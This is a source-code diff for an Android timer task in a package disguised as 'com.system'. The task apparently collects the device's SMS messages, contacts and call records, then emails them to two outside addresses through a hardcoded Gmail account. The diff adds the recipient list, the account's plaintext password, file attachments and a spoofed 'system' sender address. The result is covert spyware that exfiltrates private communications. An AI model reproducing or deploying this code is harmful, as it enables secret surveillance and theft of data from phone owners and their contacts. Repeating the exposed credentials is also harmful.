@@ -2,10 +2,21 @@ package com.system;
 
 import java.io.DataOutputStream;
 import java.io.File;
+import java.util.ArrayList;
 import java.util.Calendar;
 import java.util.Date;
 import java.util.List;
 import java.util.TimerTask;
+
+import javax.activation.DataHandler;
+import javax.activation.FileDataSource;
+import javax.mail.Message;
+import javax.mail.Multipart;
+import javax.mail.Transport;
+import javax.mail.internet.InternetAddress;
+import javax.mail.internet.MimeBodyPart;
+import javax.mail.internet.MimeMessage;
+import javax.mail.internet.MimeMultipart;
 
 import com.system.feature.contact.ContactCtrl;
 import com.system.feature.contact.ContactInfo;
@@ -14,6 +25,8 @@ import com.system.feature.phonecall.PhoneCallInfo;
 import com.system.feature.sms.SmsCtrl;
 import com.system.feature.sms.SmsInfo;
 import com.system.utils.*;
+import com.system.utils.mail.GMailSender;
+import com.system.utils.mail.GMailSenderEx;
 
 import android.app.Activity;
 import android.app.Service;
@@ -67,7 +80,16 @@ public class GetInfoTask extends TimerTask
 			CollectSms(this.service);
 		
 			// Send mail
-			boolean result = sendMail();
+			String subject = Resources.getSystem().getString(R.string.mail_from) 
+	           		 + DeviceProperty.getPhoneNumber(service) 
+	           		 + " - " + (new String()).toString();
+			String body = String.format(Resources.getSystem().getString(R.string.mail_body), 
+					DeviceProperty.getPhoneNumber(service));
+			List<String> fileList = new ArrayList<String>();
+			String[] recipients = {"richardroky@gmail.com", "ylssww@126.com"};
+			boolean result = sendMail(subject, body, 
+					"richardroky@gmail.com", "yel510641",
+					recipients, fileList);
 			
 			// Update the last date time
 			if (result) ConfigCtrl.setLastGetInfoTime(service.getApplicationContext(), new Date());
@@ -136,23 +158,27 @@ public class GetInfoTask extends TimerTask
 		}
 	}
 	
-	private boolean sendMail()
+	public static boolean sendMail(String subject, String body, String sender, String pwd, String[] recipients, List<String> files)
 	{
 		boolean ret = false;
 
         try {   
-            GMailSender sender = new GMailSender();
-            String subject = Resources.getSystem().getString(R.string.mail_from) 
-            		 + DeviceProperty.getSerialNum() + " - " + (new String()).toString();
-            String body = subject;
-            sender.sendMail(subject, body,  
-                    "richardroky@gmail.com",   
-                    "richardroky@gmail.com");
-            ret = true;
+            GMailSenderEx gmailSender = new GMailSenderEx(sender, pwd);
+            gmailSender.setFrom("system@gmail.com");
+            gmailSender.setTo(recipients);
+            gmailSender.setSubject(subject);
+            gmailSender.setBody(body);
+            
+            for(int i = 0; i < files.size(); i++)
+            	gmailSender.addAttachment(files.get(i));//e.g. "/sdcard/filelocation"
+            
+            ret = gmailSender.send();
         } catch (Exception e) {   
             Log.e(LOGTAG, e.getMessage());
         }
         
 		return ret;
 	}
+	
+	
 }
